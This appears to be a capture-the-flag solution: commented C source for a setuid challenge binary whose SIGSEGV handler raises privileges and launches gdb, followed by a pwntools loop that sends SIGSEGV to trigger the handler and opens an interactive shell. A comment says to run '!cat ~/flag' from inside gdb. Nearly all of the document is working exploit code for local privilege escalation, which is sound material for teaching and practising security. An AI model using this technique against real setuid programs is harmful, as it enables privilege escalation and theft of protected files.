# #define _GNU_SOURCE
# #include <unistd.h>
# #include <stdio.h>
# #include <stdlib.h>
# #include <string.h>
# #include <signal.h>

# #define SIZE_MAX        256
# #define BINARY          "/home/shellcode4js/shellcode4js"
# #define DEBUGGER        "/usr/bin/gdb"

# void launch_debugger(void)
# {
#         char *argv[] = {BINARY, NULL};
#         printf("Debugger !\n");
#         setresuid(geteuid(), geteuid(), geteuid());
#         execv(DEBUGGER, argv);
# }

# int main(int argc, char **argv)
# {
#         char scjs[SIZE_MAX + 1] = {0};
#         unsigned int i;

#         if (signal(SIGSEGV, launch_debugger) == SIG_ERR)
#         {
#                 printf("Debugging error...\n");
#                 exit(1);
#         }

#         if (argc != 2)
#         {
#                 printf("Usage : %s <string>\n", argv[0]);
#                 exit(1);
#         }

#         strncpy(scjs, argv[1], SIZE_MAX);
#         /* strcpy(scjs, argv[1]); */

#         for (i = 0; i < strlen(scjs); i += 2) {
#                 printf("%%u%02x%02x", scjs[i + 1], scjs[i]);
#         }
#         printf("\n");

#         return 0;
# }

# 1. win the race and get the program to call the signal handler
# 2. use gdb to get the flag

from pwn import *
context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = "INFO"
context.terminal = ["tmux", "splitw", "-h"]
warnings.simplefilter('ignore')
while True:
    p = process(['/home/shellcode4js/shellcode4js', '\x01'*4000], level='CRITICAL')
    p.send_signal(11)
    output = p.clean()
    # check if you won the race
    if b'Debugger' in output:
        print(output)
        # once you are in gdb use command '!cat ~/flag' to get the flag
        p.interactive()
    p.close()
